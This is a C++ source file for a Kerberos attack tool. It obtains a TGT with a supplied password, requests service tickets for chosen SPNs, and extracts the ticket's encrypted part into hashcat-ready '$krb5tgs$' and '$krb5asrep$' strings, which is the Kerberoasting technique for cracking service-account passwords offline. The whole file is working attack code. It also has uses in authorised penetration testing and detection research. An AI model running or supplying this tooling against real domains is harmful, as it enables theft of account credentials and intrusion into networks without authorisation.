#include "KerberosInteraction.h"
#include <iostream>
#include <stdexcept>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <algorithm>

KerberosInteraction::KerberosInteraction() {
    krb5_context ctx = nullptr;
    krb5_error_code err = krb5_init_context(&ctx);
    if (err || !ctx)
        throw std::runtime_error("Failed to initialize Kerberos context");
    context_.reset(ctx);
}

bool KerberosInteraction::requestAndCacheTGT(const std::string& username, const std::string& password) {
    auto creds = requestRawTGT(username, password);
    if (!creds) {
        return false;
    }
    
    return cacheTicket(*creds, username);
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::requestRawTGT(
    const std::string& username, 
    const std::string& password
) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return nullptr;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return nullptr;
    }

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds = obtainInitialCredentials(
        principal.get(), 
        password
    );
    if (!creds) {
        return nullptr;
    }

    std::cout << "[+] Successfully obtained TGT for " << username << std::endl;
    return creds;
}

bool KerberosInteraction::cacheTicket(const krb5_creds& creds, const std::string& username) {
    if (!context_) {
        std::cerr << "[-] No krb5 context initialized\n";
        return false;
    }

    auto principal = parsePrincipal(username);
    if (!principal) {
        return false;
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return false;
    }

    if (!initializeCache(cache.get(), principal.get())) {
        return false;
    }
    
    if (!storeInCache(cache.get(), creds)) {
        return false;
    }

    std::cout << "[+] Successfully cached TGT for " << username << std::endl;
    return true;
}

std::string KerberosInteraction::requestAndFormatTGS(const std::string& spn, const std::string& user_requesting) {
    auto userPrincipal = parsePrincipal(user_requesting);
    if (!userPrincipal) {
        std::cerr << "[-] Failed to parse user principal: " << user_requesting << std::endl;
        return "";
    }

    auto servicePrincipal = parsePrincipal(spn);
    if (!servicePrincipal) {
        std::cerr << "[-] Failed to parse service principal: " << spn << std::endl;
        return "";
    }

    krb5_principal_data* userPrincipalPtr = userPrincipal.release();
    krb5_principal_data* servicePrincipalPtr = servicePrincipal.release();  
    auto requestCreds = prepareServiceRequest(userPrincipalPtr, servicePrincipalPtr);
    if (!requestCreds) {
        return "";
    }

    auto cache = openDefaultCache();
    if (!cache) {
        return "";
    }

    auto retrievedCreds = requestRawTGS(cache.get(), requestCreds.get());
    if (!retrievedCreds) {
        std::cerr << "[-] Failed to request TGS for " << spn << std::endl;
        return "";
    }

    std::cout << "[+] Requested TGS for " << spn << std::endl;
    
    if (retrievedCreds && retrievedCreds->ticket.length > 0) {
        std::string hashcat_ticket = KerberosTicketFormatter::formatTicket_TGS(
            context_.get(), 
            *retrievedCreds.get()
        );
        return hashcat_ticket;
    } else {
        std::cerr << "[-] Retrieved credentials structure is empty or has no ticket data" << std::endl;
    }
    
    return "";
}

std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter> KerberosInteraction::parsePrincipal(
    const std::string& principalName
) {
    krb5_principal principal = nullptr;
    krb5_error_code err = krb5_parse_name(context_.get(), principalName.c_str(), &principal);
    
    if (err) {
        std::cerr << "[-] Failed to parse name '" << principalName << "': "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_principal_data, Krb5PrincipalDeleter>{
        principal, Krb5PrincipalDeleter{context_.get()}
    };
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::obtainInitialCredentials(
    krb5_principal principal,
    const std::string& password
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));

    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> creds{
        raw_creds, Krb5UserCredsDeleter{context_.get()}
    };

    krb5_error_code err = krb5_get_init_creds_password(
        context_.get(),
        creds.get(),
        principal,
        password.c_str(),
        nullptr, 
        nullptr, 
        0, 
        nullptr, 
        nullptr
    );
    
    if (err) {
        std::cerr << "[-] Failed to request TGT: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return creds;
}

std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter> KerberosInteraction::openDefaultCache() {
    krb5_ccache cache = nullptr;
    krb5_error_code err = krb5_cc_default(context_.get(), &cache);
    
    if (err) {
        std::cerr << "[-] Failed to get default ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<_krb5_ccache, Krb5CcacheDeleter>(
        cache, Krb5CcacheDeleter{context_.get()}
    );
}

bool KerberosInteraction::initializeCache(krb5_ccache cache, krb5_principal principal) {
    krb5_error_code err = krb5_cc_initialize(context_.get(), cache, principal);
    
    if (err) {
        std::cerr << "[-] Failed to initialize ccache: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

bool KerberosInteraction::storeInCache(krb5_ccache cache, const krb5_creds& creds) {
    krb5_error_code err = krb5_cc_store_cred(
        context_.get(), 
        cache, 
        const_cast<krb5_creds*>(&creds)
    );
    
    if (err) {
        std::cerr << "[-] Failed to store credentials: " 
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return false;
    }
    
    return true;
}

std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> KerberosInteraction::prepareServiceRequest(
    krb5_principal userPrincipal,
    krb5_principal servicePrincipal
) {
    krb5_creds* raw_creds = new krb5_creds();
    std::memset(raw_creds, 0, sizeof(krb5_creds));
    
    std::unique_ptr<krb5_creds, Krb5UserCredsDeleter> cred{ 
        raw_creds, Krb5UserCredsDeleter{ context_.get() } 
    };
    
    cred.get()->client = userPrincipal;
    cred.get()->server = servicePrincipal;

    return cred;
}

std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter> KerberosInteraction::requestRawTGS(
    krb5_ccache cache,
    krb5_creds* requestTemplate
) {
    krb5_creds* out = nullptr;

    krb5_error_code err = krb5_get_credentials(
        context_.get(), 
        0, 
        cache, 
        requestTemplate, 
        &out
    );

    if (err) {
        std::cerr << "[-] Failed to retrieve service credentials: "
                  << krb5_get_error_message(context_.get(), err) << std::endl;
        return nullptr;
    }

    return std::unique_ptr<krb5_creds, Krb5LibraryCredsDeleter>(
        out, Krb5LibraryCredsDeleter{context_.get()}
    );
}

std::string KerberosTicketFormatter::formatTicket_TGS(krb5_context ctx, const krb5_creds& creds) {
    std::string client_full = principal_to_string(ctx, creds.client);
    std::string server_full = principal_to_string(ctx, creds.server);

    if (client_full.empty() || server_full.empty()) {
        std::cerr << "[-] Could not unparse client or server name" << std::endl;
        return "";
    }

    std::string server_name, server_realm;
    split_principal(server_full, server_name, server_realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;
    
    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher OCTET STRING in ticket" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid encryption type in ticket" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small for checksum. "
                  << "Got " << cipherLoc->length << " bytes, need at least " << checksum_size << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildTGSHash(server_name, server_realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::formatTicket_TGT(
    krb5_context ctx, 
    const krb5_creds& creds
) {
    std::string username_full = principal_to_string(ctx, creds.client);
    if (username_full.empty()) {
        std::cerr << "[-] Could not unparse client name" << std::endl;
        return "";
    }

    std::string username, realm;
    split_principal(username_full, username, realm);

    const unsigned char* ticket_data = (const unsigned char*)creds.ticket.data;
    size_t ticket_len = creds.ticket.length;

    auto cipherLoc = findCipherInTicket(ticket_data, ticket_len);
    if (!cipherLoc) {
        std::cerr << "[-] Could not find cipher in TGT" << std::endl;
        return "";
    }

    auto etype = findEncryptionType(ticket_data, cipherLoc->offset);
    if (!etype) {
        std::cerr << "[-] Could not find valid etype in TGT" << std::endl;
        return "";
    }

    size_t checksum_size = getChecksumSize(*etype);
    if (cipherLoc->length < checksum_size) {
        std::cerr << "[-] Cipher too small" << std::endl;
        return "";
    }

    std::string checksum_hex = to_hex(cipherLoc->start, checksum_size);
    std::string enc_data_hex = to_hex(cipherLoc->start + checksum_size, cipherLoc->length - checksum_size);

    return buildASREPHash(username, realm, *etype, checksum_hex, enc_data_hex);
}

std::string KerberosTicketFormatter::principal_to_string(
    krb5_context context, 
    krb5_principal principal
) {
    char* name_buf = nullptr;
    krb5_error_code ret = krb5_unparse_name(context, principal, &name_buf);

    if (ret) {
        return "";
    }

    std::string name_str(name_buf);
    krb5_free_unparsed_name(context, name_buf); 
    return name_str;
}

void KerberosTicketFormatter::split_principal(
    const std::string& full_principal, 
    std::string& name, 
    std::string& realm
) {
    size_t at_pos = full_principal.find('@');
    if (at_pos == std::string::npos) {
        name = full_principal;
        realm = "";
    } else {
        name = full_principal.substr(0, at_pos);
        realm = full_principal.substr(at_pos + 1);
    }
}

std::optional<KerberosTicketFormatter::CipherLocation> 
KerberosTicketFormatter::findCipherInTicket(
    const unsigned char* ticket_data,
    size_t ticket_len
) {
    for (size_t i = 0; i < ticket_len - 4; i++) {
        if (ticket_data[i] == 0x04 && (ticket_data[i+1] == 0x82)) {
            size_t len = (ticket_data[i+2] << 8) | ticket_data[i+3];
            
            if (len > 1000) {
                CipherLocation loc;
                loc.start = ticket_data + i + 4;
                loc.length = len;
                loc.offset = i;
                return loc;
            }
        }
    }
    return std::nullopt;
}

std::optional<krb5_enctype> KerberosTicketFormatter::findEncryptionType(
    const unsigned char* ticket_data,
    size_t cipher_offset
) {
    size_t search_start = (cipher_offset > 100) ? cipher_offset - 100 : 0;
    
    for (size_t i = cipher_offset - 1; i > search_start; i--) {
        if (ticket_data[i] == 0x02 && i + 2 < cipher_offset) {
            size_t int_len = ticket_data[i + 1];
            
            if (int_len == 1) {
                krb5_enctype potential_etype = ticket_data[i + 2];
                if (potential_etype == 17 || potential_etype == 18 || potential_etype == 23) {
                    return potential_etype;
                }
            } else if (int_len == 2 && i + 3 < cipher_offset) {
                krb5_enctype potential_etype = (ticket_data[i + 2] << 8) | ticket_data[i + 3];
                if (potential_etype == 17 || potential_etype == 18 || potential_etype == 23) {
                    return potential_etype;
                }
            }
        }
    }
    return std::nullopt;
}

inline size_t KerberosTicketFormatter::getChecksumSize(krb5_enctype etype) {
    switch (etype) {
        case 17:  // AES128
        case 18:  // AES256
            return 12;
        case 23:  // RC4-HMAC
            return 16;
        default:
            return 0;
    }
}

inline const char* KerberosTicketFormatter::getEncryptionName(krb5_enctype etype) {
    switch (etype) {
        case 17: 
            return "AES128-CTS-HMAC-SHA1-96";
        case 18: 
            return "AES256-CTS-HMAC-SHA1-96";
        case 23: 
            return "RC4-HMAC";
        default: 
            return "UNKNOWN";
    }
}

std::string KerberosTicketFormatter::to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << static_cast<unsigned>(data[i]);
    }
    return ss.str();
}

std::string KerberosTicketFormatter::buildTGSHash(
    const std::string& serverName,
    const std::string& serverRealm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::string realm_lower = serverRealm;
    std::transform(realm_lower.begin(), realm_lower.end(), realm_lower.begin(), ::tolower);
    std::string spn_field = realm_lower + "/" + serverName;

    std::stringstream ss_hash;
    ss_hash << "$krb5tgs$" << etype << "$*"
        << serverName << "$" << serverRealm << "$"
        << spn_field << "*$"
        << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}

std::string KerberosTicketFormatter::buildASREPHash(
    const std::string& username,
    const std::string& realm,
    krb5_enctype etype,
    const std::string& checksumHex,
    const std::string& encDataHex
) {
    std::stringstream ss_hash;
    ss_hash << "$krb5asrep$" << etype << "$"
            << username << "@" << realm << ":"
            << checksumHex << "$" << encDataHex;

    return ss_hash.str();
}